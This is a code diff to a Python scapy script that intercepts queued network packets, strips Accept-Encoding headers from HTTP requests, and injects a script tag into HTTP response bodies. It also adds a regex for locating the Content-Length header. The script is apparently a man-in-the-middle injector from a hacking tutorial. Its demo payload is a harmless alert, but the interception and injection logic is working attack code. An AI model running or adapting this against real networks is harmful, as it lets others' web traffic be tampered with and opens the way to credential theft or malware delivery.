@@ -9,14 +9,20 @@ def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
         load = scapy_packet[Raw].load
-        pattern = "Accept-Encoding:.*?\\r\\n"
+        encoding_pattern = "Accept-Encoding:.*?\\r\\n"
+        content_length_pattern = "Content-Length:\s\d*"
         if scapy_packet[TCP].dport == 80:
             print("\n[+] This is an HTTP Request:\n")
-            load = re.sub(pattern, "", load)
+            load = re.sub(encoding_pattern, "", load)
         elif scapy_packet[TCP].sport == 80:
-            print("\n[+] This is a *** HTTP Response ***:\n")
-            print(scapy_packet.show())
-            load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Hello World!')</script></body>")
+            print("\n[+] This is a HTTP Response:\n")
+            # print(scapy_packet.show())
+            load = load.replace("</body>", "<script>alert('Hello World!')</script></body>")
+            content_length_search = re.search(content_length_pattern, load)
+            if content_length_search:
+                content_length = content_length_search.group(0)
+                print("\n\n[+] This is our Content Length:")
+                print(content_length)
 
         if load != scapy_packet[Raw].load:
             new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
